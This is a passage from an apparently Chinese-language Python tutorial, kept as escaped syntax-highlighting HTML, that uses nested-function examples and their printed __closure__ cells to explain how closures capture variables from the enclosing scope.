&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__closure__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; None  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;上例也证明内部函数bar只包含对嵌套作用域的引用，而不是全局作用域的引用，因为第4行引用的变量是全局的变量x。而通过第7行打印也证明这一点，bar函数的&lt;code&gt;__closure__&lt;&#x2F;code&gt;属性返回为None，也就是空值。如果嵌套作用域内有变量x，那么&lt;code&gt;__closure__&lt;&#x2F;code&gt;属性内就会存在嵌套作用域的变量地址。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;x&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;y&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;    &lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;b1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;x&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;b1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__closure__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; (&amp;lt;cell at 0x00B6D070: int object at 0x604999C0&amp;gt;,)  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;x&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;y&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;    &lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;b2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;x&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;y&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;b2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__closure__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; (&amp;lt;cell at 0x0123DED0: int object at 0x604999C0&amp;gt;, &amp;lt;cell at 0x01248430: int object at 0x604999D0&amp;gt;)  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;但有一点需要说明的是，不管嵌套作用域内定义了多少变量。而内部函数包含对嵌套作用域的引用这句话。指的是内部函数的&lt;code&gt;__closure__&lt;&#x2F;code&gt;属性内的元组内元素个数，取决于在局部作用域中对嵌套作用域中哪些变量的引用。如上例，在f1函数内定义了两个变量，但在b1函数只引用了x这一个变量。所以b1函数的&lt;code&gt;__closure__&lt;&#x2F;code&gt;属性内只存在一个嵌套作用域的变量地址。而第13行在局部作用域引用了两个嵌套作用域的变量。故b2的&lt;code&gt;__closure__&lt;&#x2F;code&gt;内就有两个值。&lt;&#x2F;p&gt;
&lt;p&gt;上面的例子都为闭包函数的一层嵌套形式，下面的例子为闭包函数的两层嵌套形式。跟一层闭包函数一样，最内层的函数，包含对嵌套作用域的引用。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;name&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;oldboy&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;    &lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;money&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1000&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;        &lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;oldboy_info&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;            &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-constant z-other z-placeholder z-python&quot;&gt;%s&lt;&#x2F;span&gt; have money: &lt;span class=&quot;z-constant z-other z-placeholder z-python&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;%&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-sequence z-tuple z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;name&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-sequence z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;money&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;        &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;oldboy_info&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;oldboy_info&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
